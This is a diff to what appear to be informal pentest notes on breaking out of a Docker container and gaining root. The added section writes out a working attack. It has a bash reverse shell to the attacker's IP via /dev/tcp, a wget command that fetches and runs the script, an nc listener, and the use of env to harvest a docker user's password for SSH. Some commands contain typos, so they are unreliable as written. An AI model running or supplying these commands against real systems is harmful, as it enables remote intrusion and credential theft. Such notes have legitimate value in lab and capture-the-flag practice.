@@ -29,3 +29,23 @@ now you have a bash with root priv's
 THIS WORKS CAUSE:
 1) THE HOST DIR IS SHARED TO THE HOST AND CONTAINER
 2) WE GOT A ROOT SHELL ON CONTAINER FIRST
+
+
+---------------------------------------------------------------------------------------------------------------------
+This time you get into a machine with "root" but you are at a docker.
+
+1. (at yout pc) nano rev.sh
+
+the rev has: 
+    #!/bin/bash
+    bash -1 >& /dev/tcp/<yourip>/<yourport> 0>&1
+
+and yo ustart a python server at this terminal dir: python -m http.server 8000
+
+2. wget http://<yourip>:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh
+
+and nc -lvpn yourport
+
+
+after you get in:
+1. env  (and you find the password of the docker user) and ssh with it.
